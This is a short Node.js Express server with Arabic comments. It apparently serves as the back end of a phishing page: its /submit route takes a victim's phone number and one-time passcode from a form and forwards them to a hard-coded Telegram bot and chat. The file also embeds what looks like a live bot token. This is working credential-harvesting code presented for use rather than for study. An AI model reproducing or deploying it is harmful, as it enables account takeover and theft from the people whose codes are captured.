const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// ========== إعدادات تيلجرام ==========
const TELEGRAM_TOKEN = '8810906768:AAEPvCGIGJI8cJtzloiRQYd0GV_W6aHLdO4';
const TELEGRAM_CHAT_ID = '8140097273';

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, 'views')));

// ========== دالة إرسال إشعار ==========
async function sendTelegramMessage(message) {
    try {
        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        console.log(response.ok ? '✅ تم الإرسال' : '❌ فشل');
    } catch (e) {
        console.error('❌ خطأ:', e.message);
    }
}

// ========== اختبار البوت ==========
app.get('/test', async (req, res) => {
    await sendTelegramMessage('✅ البوت شغال! 🎉');
    res.send('✅ تم إرسال رسالة اختبار! شوف تيلجرام');
});

// ========== الصفحة الرئيسية ==========
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'index.html'));
});

// ========== استقبال البيانات ==========
app.post('/submit', async (req, res) => {
    const { phone, otp } = req.body;
    
    console.log('📱 هاتف:', phone);
    console.log('🔑 OTP:', otp);
    
    // رسالة تيلجرام
    let msg = `✅ <b>بيانات جديدة!</b>\n`;
    msg += `🕐 ${new Date().toLocaleString('ar-EG')}\n`;
    msg += `━━━━━━━━━━━━━━━━━━━━\n`;
    msg += `📱 ${phone}\n`;
    msg += `🔑 ${otp}`;
    
    await sendTelegramMessage(msg);
    
    res.json({ success: true, message: 'تم الاستلام' });
});

app.listen(PORT, () => {
    console.log(`✅ السيرفر شغال على http://localhost:${PORT}`);
});
